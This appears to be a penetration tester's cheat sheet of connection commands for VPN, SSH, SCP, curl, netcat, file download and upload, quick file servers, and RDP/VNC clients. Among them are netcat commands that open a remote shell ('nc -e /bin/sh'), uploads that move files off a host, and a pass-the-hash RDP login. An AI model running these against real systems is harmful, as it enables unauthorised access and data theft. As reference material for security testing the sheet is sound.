# Connection

## Client

### VPN

```
openvpn <config file>.ovpn
openvpn --config <ovpn file> --auth-user-pass <creds file>    #creds are username and password separated by a line break
```

### SSH

```
ssh <user>@<ip> -p <port>
ssh <user>@<ip> -i <path to private key>
```

#### Create a private key

```
ssh-keygen -t <rsa/dsa/ecsda> -f <file>
chmod 600 <file>
```

### SCP

Transfer remote file or folder to local

```
scp <user>@<host>:<filepath> <local path>
scp -i <pkey> <user>@<host>:<filepath> <local path>
scp -r <user>@<host>:<folder> <local path>
```

Transfer local file or folder to remote

```
scp <file> <user>@<host>:<path>
scp -i <pkey> <file> <user>@<host>:<filepath>
scp -r <folder> <user>@<host>:<path>
```

Transfer from remote to remote

```
scp <user1>@<host1>:<file> <user2>@<host2>:<dest path>
```

### HTTP

```
curl <url>                 #print html page
curl -v <url> -s           #banner grabbing
curl -i <url>              #banner grabbing
curl -H '<custom header arg i.e. User-Agent: <str>>' <url>
```

### Generic Ports

```
nc -nCv <ip> <port>        #try with or without -C if console hangs
telnet <ip> <port>         #good luck exiting the terminal without an US keyboard
```

If the connection is established but we're unable to execute commands try to manually invoke the shell command

```
nc -e </bin/sh|/bin/bash|cmd.exe> <ip> <port>      
nc -c <sh|bash|cmd.exe> <ip> <port>
```

### File Download

#### Download

```
wget <url>                 #download file from HTTP server
wget <url> -O <local path>
wget ftp:\\<url>\<file>    #download file from anonymous ftp server
```

#### Download recursive

Useful when executing commands in limited shells\filtered inputs that don't allow "/". All files within the remote server's working folder will be transferred to the target without having to specify the full URLs

```
wget -r <ip> -nH
```

### File Upload

```
curl -T <file> http://<url>/         #HTTP PUT
curl -T <file> ftp://<url>/<path>    #FTP
curl -T <file> smtp://<mail server> --mail-from user@example.com
curl -F "files=@<file>" <IP>        #HTTP upload file using JQuery
```

#### POST upload

```
curl -d <param>=<value> -d <param2>=<value2> http://<url>/        #arguments
curl -d '<string or args i.e. admin=admin&pass=pass>' http://url  #string
curl -d @<filename> http://<url>/                                 #file
```

## Server

Require `impacket`for python 2/3. See [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

### HTTP

```
python -m SimpleHTTPServer <port>
```

[**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)

### FTP

```
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### SMB

```
smbserver.py -smb2support <name> <path to folder>
```

## Remote desktop

### rdesktop

```
rdesktop <ip>
rdesktop <ip> -u <user>@<domain> -p <pass> -g 1024x768
rdesktop <ip> -u <user> -p <pass> -f                    #fullscreen 
rdesktop <ip> -r disk:share=<local folder to share>     #share folder with remote client
```

### xfreerdp

```
xfreerdp /d:<domain> /u:<user> /v:<host> +clipboard              #share clipboard
xfreerdp /d:<domain> /u:<user> /v:<host> +drives                 #share all mount points
xfreerdp /d:<domain> /u:<user> /v:<host> +home-drive             #share home folder
xfreerdp /d:<domain> /u:<user> /v:<host> /dynamic-resolution     #allow window resize

xfreerdp /u:"<user>" -p:"<password>" /v:<host>
xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>:<port>
xfreerdp /u:<user> /pth:<hash> /v:<ip>     #login with hash

xfreerdp /v:<host> /dynamic-resolution +clipboard +home-drive 
```

### VNC

```
vncviewer <ip> 
vncviewer -fullscreen <ip> 
```

Press F8 to use options such as copy between remote and local clipboard, send ctrl+alt+del to remote machine and remove popups
